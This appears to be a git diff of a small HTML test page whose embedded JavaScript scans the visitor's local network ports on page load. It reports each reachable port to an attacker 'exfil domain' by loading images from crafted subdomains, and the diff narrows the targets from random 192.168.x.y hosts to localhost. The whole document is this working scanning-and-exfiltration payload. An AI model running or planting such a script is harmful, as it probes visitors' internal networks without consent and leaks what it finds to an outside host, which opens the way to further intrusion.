@@ -1,8 +1,8 @@
 <html>
 <head><title>test</title>
 <script>
-let host_root = "d0c3a6c04arnnmh5u.xtric.homes"; // your exfil domain
-let a = Math.floor(Math.random() * 256);
+let host_root = "d0cprb40z4t67sqo9.xtric.homes"; // your exfil domain
+//let a = Math.floor(Math.random() * 256);
 
 //const top_ports = [
 //  80, 443, 8080, 8000, 8888, 8443, 22, 21, 23, 25, 110, 143,
@@ -24,9 +24,9 @@ function sleep(ms) {
 }
 
 async function scan() {
-  for (let b = 0; b < 256; b++) {
+  //for (let b = 0; b < 256; b++) {
     for (let port of top_ports) {
-      let ip = `192.168.${a}.${b}`;
+      let ip = `127.0.0.1`;
       let url = `http://${ip}:${port}`;
 
       try {
@@ -36,14 +36,14 @@ async function scan() {
         });
 
         let img = new Image();
-        img.src = `http://ip192-168-${a}-${b}-${port}.${host_root}`;
+        img.src = `http://ip127-0-0-1-${port}.${host_root}`;
       } catch (e) {
         // Silent fail
       }
 
-      await sleep(10); // throttle
+      await sleep(50); // throttle
     }
-  }
+  //}
 }
 
 scan();
